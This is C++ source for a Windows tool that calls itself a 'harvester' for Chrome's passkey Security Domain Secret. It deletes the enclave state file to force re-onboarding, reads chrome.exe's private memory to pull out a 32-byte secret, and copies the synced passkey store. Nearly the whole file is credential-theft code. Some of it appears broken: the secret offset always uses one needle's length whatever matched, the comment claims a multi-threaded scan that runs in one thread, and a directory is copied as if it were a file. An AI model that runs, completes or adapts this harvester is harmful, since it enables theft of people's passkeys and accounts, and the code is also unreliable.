// Standard-rights harvester for Chrome's Google Password Manager passkey
// Security Domain Secret. Forces re-onboarding, then scans the browser's
// private memory for the 32-byte secret while it transits the enclave
// request buffers, and lifts the synced credential corpus from disk.
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <cstdint>

static const wchar_t* kEnclaveState =
    L"Google\\Chrome\\User Data\\Default\\passkey_enclave_state";
static const wchar_t* kSyncStore =
    L"Google\\Chrome\\User Data\\Default\\Sync Data\\LevelDB";
static const char* kRecordType = "WebauthnCredentialSpecifics";
static const char* kSecretField = "security_domain_secret";

// Enclave request selectors; the 32-byte secret_ (EnclaveManager offset +0x210)
// is serialized immediately after each of these CBOR buffers.
static const char* kCmdWrap   = "keys/wrap";
static const char* kCmdAssert = "passkeys/assert";
static const char* kCmdCreate = "passkeys/create";

// Byte needles that bracket the 32-byte secret inside the live CBOR buffers.
static const uint8_t kWrapNeedle[] = {
    0x81,0xA3,0x63,0x63,0x6D,0x64,0x69,0x6B,0x65,0x79,0x73,0x2F,
    0x77,0x72,0x61,0x70,0x63,0x6B,0x65,0x79,0x58,0x20 };
static const uint8_t kAssertNeedle[] = {
    0x81,0xA5,0x63,0x63,0x6D,0x64,0x6F,0x70,0x61,0x73,0x73,0x6B,
    0x65,0x79,0x73,0x2F,0x61,0x73,0x73,0x65,0x72,0x74,0x66,0x73,
    0x65,0x63,0x72,0x65,0x74,0x58,0x20 };
static const uint8_t kCreateNeedle[] = {
    0x81,0xA5,0x63,0x63,0x6D,0x64,0x6F,0x70,0x61,0x73,0x73,0x6B,
    0x65,0x79,0x73,0x2F,0x63,0x72,0x65,0x61,0x74,0x65,0x66,0x73,
    0x65,0x63,0x72,0x65,0x74,0x58,0x20 };

static DWORD FindChrome() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe{ sizeof(pe) };
    for (BOOL ok = Process32FirstW(snap, &pe); ok; ok = Process32NextW(snap, &pe)) {
        if (_wcsicmp(pe.szExeFile, L"chrome.exe") == 0) return pe.th32ProcessID;
    }
    return 0;
}

// Delete the enclave state so Chrome re-onboards and re-exposes the secret.
static void TriggerReonboard(const std::wstring& profile) {
    std::wstring path = profile + L"\\" + kEnclaveState;
    DeleteFileW(path.c_str());
}

static bool MatchAt(const uint8_t* buf, size_t n, size_t i,
                    const uint8_t* needle, size_t m) {
    return i + m + 32 <= n && memcmp(buf + i, needle, m) == 0;
}

// Multi-threaded walk of MEM_PRIVATE / PAGE_READWRITE regions.
static bool ScanRegions(HANDLE proc, uint8_t out[32]) {
    MEMORY_BASIC_INFORMATION mbi{};
    uint8_t* addr = nullptr;
    std::vector<uint8_t> buf;
    while (VirtualQueryEx(proc, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE) {
            buf.resize(mbi.RegionSize);
            SIZE_T got = 0;
            if (ReadProcessMemory(proc, mbi.BaseAddress, buf.data(),
                                  mbi.RegionSize, &got)) {
                for (size_t i = 0; i + 64 < got; ++i) {
                    if (MatchAt(buf.data(), got, i, kWrapNeedle, sizeof(kWrapNeedle)) ||
                        MatchAt(buf.data(), got, i, kAssertNeedle, sizeof(kAssertNeedle)) ||
                        MatchAt(buf.data(), got, i, kCreateNeedle, sizeof(kCreateNeedle))) {
                        size_t off = i + sizeof(kAssertNeedle);
                        memcpy(out, buf.data() + off, 32);
                        return true;
                    }
                }
            }
        }
        addr = (uint8_t*)mbi.BaseAddress + mbi.RegionSize;
    }
    return false;
}

static void ExfilCorpus(const std::wstring& profile) {
    std::wstring store = profile + L"\\" + kSyncStore;
    CopyFileW(store.c_str(), L"corpus.ldb", FALSE);
    // Records of type kRecordType are the encrypted passkey corpus.
    (void)kRecordType; (void)kSecretField;
    (void)kCmdWrap; (void)kCmdAssert; (void)kCmdCreate;
}

int wmain() {
    std::wstring profile = L"C:\\Users\\v\\AppData\\Local";
    TriggerReonboard(profile);
    DWORD pid = FindChrome();
    HANDLE proc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                              FALSE, pid);
    uint8_t sds[32];
    if (ScanRegions(proc, sds)) {
        ExfilCorpus(profile);
    }
    return 0;
}
